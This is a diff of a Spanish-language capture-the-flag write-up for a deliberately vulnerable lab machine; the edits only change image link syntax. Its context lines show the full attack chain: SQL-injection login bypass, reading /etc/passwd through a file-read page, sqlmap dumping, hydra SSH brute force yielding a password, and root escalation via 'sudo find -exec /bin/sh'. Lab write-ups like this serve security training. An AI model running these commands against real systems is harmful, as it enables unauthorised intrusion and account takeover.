@@ -39,7 +39,7 @@ La máquina aloja "AFN" (All Fake News), un sitio web con un login vulnerable a 
 sudo nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 192.168.241.150
 ```
 
-![[IMG-20260809171454180.png]]
+![](images/IMG-20260809171454180.png)
 
 ### 2. Escaneo de versiones
 
@@ -47,11 +47,11 @@ sudo nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 192.168.241.150
 nmap -p 22,80 -sC -sV -oN allports 192.168.241.150
 ```
 
-![[IMG-20260809171454267.png]]
+![](images/IMG-20260809171454267.png)
 
 ### 3. Enumeración web — revisión del código fuente
 
-![[IMG-20260809171454391.png]]
+![](images/IMG-20260809171454391.png)
 
 Se accede a `http://192.168.241.150/` y se revisa el HTML. Además del contenido de relleno tipo "Lorem Ipsum", destaca un enlace a `sqli.php` en una de las noticias, sugiriendo (como pista narrativa del propio reto) una posible inyección SQL en algún punto del sitio. No se profundiza en `sqli.php` directamente ya que el fuzzing de directorios (paso siguiente) revela un vector más concreto: un formulario de login real.
 
@@ -61,7 +61,7 @@ Se accede a `http://192.168.241.150/` y se revisa el HTML. Además del contenido
 dirsearch -u http://192.168.241.150/ --exclude-status 403,404,500 -e php,txt,html
 ```
 
-![[IMG-20260809171454449.png]]
+![](images/IMG-20260809171454449.png)
 
 ### 5. Bypass de autenticación por SQLi en el login
 
@@ -69,7 +69,7 @@ dirsearch -u http://192.168.241.150/ --exclude-status 403,404,500 -e php,txt,htm
 http://192.168.241.150/login.php
 ```
 
-![[IMG-20260809171454509.png]]
+![](images/IMG-20260809171454509.png)
 
 Credenciales usadas: `admin` / `' OR '1'='1`
 
@@ -81,7 +81,7 @@ El bypass funciona y se obtiene acceso a `admin.php`.
 http://192.168.241.150/admin.php
 ```
 
-![[IMG-20260809171454565.png]]
+![](images/IMG-20260809171454565.png)
 
 El diario menciona la creación de una `to-do-list`:
 
@@ -96,7 +96,7 @@ voy a crear una to-do-list para ir cubriendo todos mis súper objetivos.
 http://192.168.241.150/todo-list.php
 ```
 
-![[IMG-20260809171454613.png]]
+![](images/IMG-20260809171454613.png)
 
 Una de las tareas revela, sin darse cuenta el propio desarrollador, el nombre codificado en Base64 de una página que permite leer archivos internos del servidor:
 
@@ -112,7 +112,7 @@ nombre en base64, así nadie podrá dar con ella (lee_archivos).
 echo 'lee_archivos' | base64
 ```
 
-![[IMG-20260809171454661.png]]
+![](images/IMG-20260809171454661.png)
 
 ### 9. Acceso a la página de lectura de archivos
 
@@ -120,7 +120,7 @@ echo 'lee_archivos' | base64
 http://192.168.241.150/bGVlX2FyY2hpdm9zCg==.php
 ```
 
-![[IMG-20260809171454711.png]]
+![](images/IMG-20260809171454711.png)
 
 Se trata de un formulario que permite introducir una ruta de archivo. Al probar `/etc/passwd`:
 
@@ -134,7 +134,7 @@ superadministrator:x:1001:1001:,,,:/home/superadministrator:/bin/bash
 
 Y, dejados por el propio desarrollador, dos comentarios HTML clave:
 
-![[IMG-20260809171454765.png]]
+![](images/IMG-20260809171454765.png)
 
 ```html
 <!-- Tengo que limitar los archivos que se pueden ver, al menos hasta que los usuarios tengan unas contraseñas más robustas -->
@@ -149,7 +149,7 @@ Esto confirma tanto los nombres de usuario del sistema como la vía de ataque su
 sqlmap -u 'http://192.168.241.150/login.php' --batch --dump --forms
 ```
 
-![[IMG-20260809171454813.png]]
+![](images/IMG-20260809171454813.png)
 
 
 Estos usuarios pertenecen a la aplicación web, no al sistema operativo, y ninguno coincide con `superadministrator` (usuario del sistema visto en `/etc/passwd`). Vía descartada para el acceso SSH.
@@ -162,7 +162,7 @@ Siguiendo la pista dejada en el comentario HTML:
 hydra -l superadministrator -P /usr/share/wordlists/rockyou.txt ssh://192.168.241.150 -t 4
 ```
 
-![[IMG-20260809171454864.png]]
+![](images/IMG-20260809171454864.png)
 
 Credenciales encontradas: `superadministrator:princesa`
 
@@ -176,7 +176,7 @@ ssh superadministrator@192.168.241.150
 superadministrator@thehackerslabs-bocatacalamares:~$ cat flag.txt
 ```
 
-![[IMG-20260809171454926.png]]
+![](images/IMG-20260809171454926.png)
 
 Al decodificar en Base64, el contenido no es la flag en sí sino una pista para el siguiente paso:
 
@@ -184,7 +184,7 @@ Al decodificar en Base64, el contenido no es la flag en sí sino una pista para 
 echo 'c3VkbyAtbAo=' | base64 -d
 ```
 
-![[IMG-20260809171454974.png]]
+![](images/IMG-20260809171454974.png)
 
 También se encuentra una nota adicional:
 
@@ -192,7 +192,7 @@ También se encuentra una nota adicional:
 superadministrator@thehackerslabs-bocatacalamares:~$ cat recordatorio.txt
 ```
 
-![[IMG-20260809171455037.png]]
+![](images/IMG-20260809171455037.png)
 
 ```
 Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo aquí apuntada para recordarlo mas adelante.
@@ -204,7 +204,7 @@ Me han dicho que existe una pagina llamada gtfobins muy util para ctfs, la dejo 
 superadministrator@thehackerslabs-bocatacalamares:~$ sudo -l
 ```
 
-![[IMG-20260809171455082.png]]
+![](images/IMG-20260809171455082.png)
 
 ### 14. Escalada de privilegios vía GTFOBins
 
@@ -216,7 +216,7 @@ superadministrator@thehackerslabs-bocatacalamares:~$ sudo find . -exec /bin/sh \
 # whoami
 ```
 
-![[IMG-20260809171455131.png]]
+![](images/IMG-20260809171455131.png)
 
 ### 15. Captura de la flag de root
 
@@ -225,7 +225,7 @@ superadministrator@thehackerslabs-bocatacalamares:~$ sudo find . -exec /bin/sh \
 # cat root.txt
 ```
 
-![[IMG-20260809171455186.png]]
+![](images/IMG-20260809171455186.png)
 
 ---
 
